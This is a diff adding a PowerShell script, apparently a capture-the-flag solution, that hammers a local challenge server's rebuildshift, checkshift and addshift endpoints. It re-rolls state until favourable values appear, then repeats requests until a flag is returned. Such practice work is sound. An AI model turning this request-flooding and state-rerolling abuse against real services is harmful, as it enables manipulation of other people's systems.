@@ -1,0 +1,66 @@
+Get-Date
+$counter = 0
+while($counter -lt 25){
+   (IWR "http://127.0.0.1:5000/rebuildshift").StatusCode
+   $a = (IWR "http://127.0.0.1:5000/checkshift").RawContent
+   echo $a | findstr siud
+   if($a -like '*0.4*'){
+     $ctr2 = 0
+     echo Success
+     while($ctr2 -lt 15){
+       (IWR "http://127.0.0.1:5000/addshift").StatusCode
+       $ctr2 = $ctr2+1
+     }
+   break
+   }
+}
+(IWR "http://127.0.0.1:5000/checkshift").RawContent
+
+
+$counter = 0
+while($counter -lt 25){
+   (IWR "http://127.0.0.1:5000/rebuildshift").StatusCode
+   $a = (IWR "http://127.0.0.1:5000/checkshift").RawContent
+   echo $a | findstr siud
+   if($a -like '*0.6*'){
+     $ctr2 = 0
+     echo Success
+     while($ctr2 -lt 30){
+       (IWR "http://127.0.0.1:5000/addshift").StatusCode
+       $ctr2 = $ctr2+1
+   }
+   break
+  }
+}
+(IWR "http://127.0.0.1:5000/checkshift").RawContent
+
+
+$counter = 0
+while($counter -lt 25){
+   (IWR "http://127.0.0.1:5000/rebuildshift").StatusCode
+   $a = (IWR "http://127.0.0.1:5000/checkshift").RawContent
+   echo $a | findstr siud
+   if($a -like '*0.7*'){
+     $ctr2 = 0
+     echo Success
+     while($ctr2 -lt 60){
+       (IWR "http://127.0.0.1:5000/addshift").StatusCode
+       $ctr2 = $ctr2+1
+   }
+   break
+  }
+}
+(IWR "http://127.0.0.1:5000/checkshift").RawContent
+
+$counter = 0
+while($counter -lt 25){
+   (IWR "http://127.0.0.1:5000/rebuildshift").StatusCode
+   $a = (IWR "http://127.0.0.1:5000/checkshift").RawContent
+   echo $a | findstr siud
+   if($a -like '*flag*'){
+     $ctr2 = 0
+     echo Success
+    echo $a
+    break
+   }
+}
